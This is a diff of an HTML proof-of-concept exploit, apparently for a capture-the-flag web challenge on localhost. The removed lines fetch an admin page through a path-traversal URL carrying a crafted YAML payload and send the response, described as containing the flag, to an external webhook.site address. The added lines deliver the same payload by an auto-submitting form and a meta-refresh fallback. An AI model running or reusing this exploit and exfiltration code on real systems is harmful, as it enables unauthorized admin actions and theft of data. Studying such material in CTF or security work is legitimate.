@@ -2,44 +2,14 @@
 <html>
 <head>
   <meta charset="utf-8" />
-  <title>Cute CSP PoC with Exfil</title>
+  <title>Pure HTML PoC</title>
 </head>
-<body>
-  <form id="poc" method="POST" action="http://localhost:5000/admin.php">
-    <input type="hidden" name="url" id="payload" value="">
+<body onload="document.forms[0].submit()">
+  <form method="POST" action="http://localhost:5000/admin.php" target="_top">
+    <input type="hidden" name="url" value="http://localhost:5000/admin.php/../index.php?html=-+op:+BUY%0A++amount:+1%0A++currency:+US%0A-+op:+SELL%0A++amount:+1%0A++currency:+US%0A-+op:+BUY%0A++amount:+1%0A++currency:+FL">
   </form>
 
-  <script>
-    // Our crafted YAML payload
-    const yaml = `- op: BUY
-  amount: 1
-  currency: US
-- op: SELL
-  amount: 1
-  currency: US
-- op: BUY
-  amount: 1
-  currency: FL`;
-
-    // Make admin.php fetch this YAML through index.php
-    const target = "http://localhost:5000/admin.php/../index.php?html=" + encodeURIComponent(yaml);
-    document.getElementById('payload').value = target;
-
-    // Instead of using the form, we directly fetch and exfiltrate
-    fetch("http://localhost:5000/admin.php", {
-      method: "POST",
-      headers: { "Content-Type": "application/x-www-form-urlencoded" },
-      body: "url=" + encodeURIComponent(target)
-    })
-    .then(r => r.text())
-    .then(text => {
-      // Exfiltrate the entire response (should contain the flag)
-      fetch("https://webhook.site/66635634-ac67-4436-b83a-fa8890aa7648?flag=" + encodeURIComponent(text));
-    })
-    .catch(err => {
-      // Exfiltrate any error to debug
-      fetch("https://webhook.site/66635634-ac67-4436-b83a-fa8890aa7648?error=" + encodeURIComponent(err));
-    });
-  </script>
+  <!-- Fallback: if JS disabled, meta-refresh submits via GET -->
+  <meta http-equiv="refresh" content="0;url=http://localhost:5000/admin.php?url=http://localhost:5000/admin.php/../index.php?html=-+op:+BUY%0A++amount:+1%0A++currency:+US%0A-+op:+SELL%0A++amount:+1%0A++currency:+US%0A-+op:+BUY%0A++amount:+1%0A++currency:+FL">
 </body>
 </html>
